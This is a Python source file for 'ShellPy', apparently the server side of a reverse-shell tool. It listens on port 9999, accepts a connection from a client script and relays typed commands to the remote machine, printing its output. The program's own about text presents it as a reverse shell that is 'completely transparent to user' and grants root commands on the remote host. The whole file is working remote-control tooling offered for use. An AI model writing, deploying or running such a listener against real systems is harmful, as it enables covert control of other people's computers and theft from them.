import socket
import sys
import os
import subprocess

global option
def main():
	print(" ")
	print("  SHELLPY Remote Shell Application  ")
	print(" ")
	print(" ###################################")
	print("  [1]: Connect")
	print("  [2]: About")
	print("  [3]: Quit")
	print(" ###################################")
	print(" ")
	option = input(" > ")
	options(option)

def options(a):
	if a=='1':
		connectserv()
	elif a=='2':
		print("SHELLPY ( ABOUT US ) \n\n")
		print("ShellPy is a standalone program capable of sharing your terminal and all it’s features with other desktop. In addition to this terminal service sharing, the application is completely transparent to user.\n\nA reverse shell works by the remote computer sending its shell to a specific user.This allows root commands over the remote server.\n\nTo use this reverse shell, two scripts need to be running:\n\t[*]Server.py - runs on a public server and waits for clients to connect.\n\t[*]Client.py - connects to a remote server and then wait for commands ")
		print("\nMade by Hritik")
		print("\tLink - https://github.com/iambotface/ShellPy")
		input()
	elif a=='3':
		exit()
	else:
		print("Try Again")


def connectserv():
        socket_create()
        socket_bind()
        socket_accept()

# Create socket (allows two computers to connect)
def socket_create():
    try:
        global host
        global port
        global s
        host = ''
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print("Socket creation error: " + str(msg))


# Bind socket to port (the host and port the communication will take place) and wait for connection from client
def socket_bind():
    try:
        global host
        global port
        global s
        print("Binding socket to port: " + str(port))
        s.bind((host, port))
        s.listen(5)
    except socket.error as msg:
        print("Socket binding error: " + str(msg) + "\n" + "Retrying...")
        socket_bind()


# Establish connection with client (socket must be listening for them)
def socket_accept():
    conn, address = s.accept()
    print("Connection has been established | " + "IP " + address[0] + " | Port " + str(address[1]))
    send_commands(conn)
    conn.close()


# Send commands
def send_commands(conn):
    while True:
        cmd = input()
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024), "utf-8")
            print(client_response, end="")


def about():
	print("SHELLPY ( ABOUT US ) \n\n")

	print("ShellPy is a standalone program capable of sharing your terminal and all it’s features with other desktop. In addition to this terminal service sharing, the application is completely transparent to user.\n\nA reverse shell works by the remote computer sending its shell to a specific user.This allows root commands over the remote server.\n\nTo use this reverse shell, two scripts need to be running:\n\t[*]Server.py - runs on a public server and waits for clients to connect.\n\t[*]Client.py - connects to a remote server and then wait for commands ")
	print("\nMade by Hritik")
	print("\tLink - https://github.com/iambotface/ShellPy")

def quit():
	print(" ")
	print("Quiting ShellPy...")
	sys.exit()

	
main()
